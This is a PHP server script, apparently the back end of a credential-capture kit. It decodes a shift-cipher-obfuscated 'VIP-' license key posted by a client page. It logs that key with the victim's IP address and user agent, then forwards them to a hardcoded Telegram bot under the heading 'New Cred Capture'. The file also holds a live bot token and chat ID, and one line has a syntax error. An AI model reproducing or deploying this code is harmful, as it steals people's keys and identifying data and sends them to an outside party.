<?php // xmlicense.php

define('BOT_TOKEN', '8044276202:AAHrHJkeYtumB15z9ZP7kykVrDmy0cTF-0Q');
define('CHAT_ID', '-4679773100');
$licenseLog = "licenses.log";

// 𝗗𝗶𝗿𝗲𝗰𝘁 𝗺𝗮𝘁𝗰𝗵 𝘁𝗼 𝗷𝗮𝘃𝗮𝗦𝗰𝗿𝗶𝗽𝘁 𝗲𝗻𝗰𝗿𝘆𝗽𝘁𝗶𝗼𝗻
function clientDecrypt($cipher) {
    $plain = '';
    foreach(str_split($cipher) as $char) {
        if(ctype_alpha($char)) {
            $offset = ord(ctype_upper($char) ? 65 : 97;
            // 𝗘𝘅𝗮𝗰𝘁 𝗿𝗲𝘃𝗲𝗿𝘀𝗲 𝗼𝗳 𝗰𝗹𝗶𝗲𝗻𝘁'𝘀 ((charCodeAt - offset +5) %26)
            $plain .= chr((ord($char) - $offset -5 +26) %26 + $offset);
        } else {
            $plain .= $char;
        }
    }
    return $plain;
}

// 𝗘𝘅𝗮𝗰𝘁 𝗽𝗮𝗿𝗮𝗺 𝗵𝗮𝗻𝗱𝗹𝗶𝗻𝗴 𝗳𝗿𝗼𝗺 𝗝𝗮𝘃𝗮𝗦𝗰𝗿𝗶𝗽𝘁
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $rawPayload = $_POST['encryptedKey'] ?? '';
    $decodedPayload = urldecode($rawPayload); // 𝗠𝗮𝘁𝗰𝗵𝗲𝘀 𝗲𝗻𝗰𝗼𝗱𝗲𝗨𝗥𝗜𝗖𝗼𝗺𝗽𝗼𝗻𝗲𝗻𝘁()
    $lines = explode("\n", $decodedPayload);
    
    // 𝗗𝗶𝗿𝗲𝗰𝘁 𝗿𝗲𝗽𝗹𝗶𝗰𝗮 𝗼𝗳 𝗷𝗮𝘃𝗮𝗦𝗰𝗿𝗶𝗽𝘁 𝗰𝗼𝗻𝗱𝗶𝘁𝗶𝗼𝗻𝘀
    if(count($lines) >=2 && trim($lines[0]) === 'XX') {
        $decrypted = clientDecrypt(trim($lines[1]));
        
        // 𝗠𝗮𝘁𝗰𝗵𝗲𝘀 𝗩𝗜𝗣 𝗸𝗲𝘆 𝗹𝗼𝗴𝗶𝗰 𝗳𝗿𝗼𝗺 𝘀𝗲𝗰𝗿𝗲𝘁𝗩𝗮𝗹𝘂𝗲𝘀 𝗰𝗵𝗲𝗰𝗸
        if(preg_match('/^VIP-[A-Z0-9]{15}$/', $decrypted)) {
            $clientData = [
                'userNamekey' => $decrypted, // 𝗗𝗶𝗿𝗲𝗰𝘁 𝗺𝗮𝗽𝗽𝗶𝗻𝗴 𝘁𝗼 𝗗𝗢𝗠 𝗲𝗹𝗲𝗺𝗲𝗻𝘁
                'ip' => $_SERVER['REMOTE_ADDR'],
                'user_agent' => $_SERVER['HTTP_USER_AGENT'],
                'timestamp' => date('Y-m-d H:i:s')
            ];
            
            file_put_contents($licenseLog, json_encode($clientData).PHP_EOL, FILE_APPEND);
            
            // 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 𝗮𝗹𝗲𝗿𝘁 𝘄𝗶𝘁𝗵 𝗙𝗨𝗟𝗟 𝗗𝗢𝗠 𝗱𝗮𝘁𝗮
            $tgMessage = "🕵️ <b>New Cred Capture</b>\n"
                ."🔑 <code>{$clientData['userNamekey']}</code>\n"
                ."🌐 IP: {$_SERVER['REMOTE_ADDR']}\n"
                ."🕰️ Time: ".date('H:i:s')."\n"
                ."🔍 Agent: ".substr($_SERVER['HTTP_USER_AGENT'],0,50)."...";
            
            sendToTelegram($tgMessage);
            
            die(json_encode(['status' => 'success'])); // 𝗠𝗮𝘁𝗰𝗵𝗲𝘀 𝗰𝗹𝗶𝗲𝗻𝘁'𝘀 𝗲𝘅𝗽𝗲𝗰𝘁𝗮𝘁𝗶𝗼𝗻
        }
    }
    
    // 𝗙𝗮𝗶𝗹𝘂𝗿𝗲 𝗰𝗮𝘀𝗲𝘀 𝗺𝗮𝘁𝗰𝗵 𝗰𝗹𝗶𝗲𝗻𝘁 𝗲𝗿𝗿𝗼𝗿 𝗵𝗮𝗻𝗱𝗹𝗶𝗻𝗴
    die(json_encode(['status' => 'error']));
}

function sendToTelegram($msg) {
    $url = "https://api.telegram.org/bot".BOT_TOKEN."/sendMessage";
    $data = [
        'chat_id' => CHAT_ID,
        'text' => $msg,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 3 // 𝗠𝗮𝘁𝗰𝗵 𝗰𝗹𝗶𝗲𝗻𝘁'𝘀 𝟱𝘀 𝘁𝗶𝗺𝗲𝗼𝘂𝘁
    ]);
    curl_exec($ch);
    curl_close($ch);
}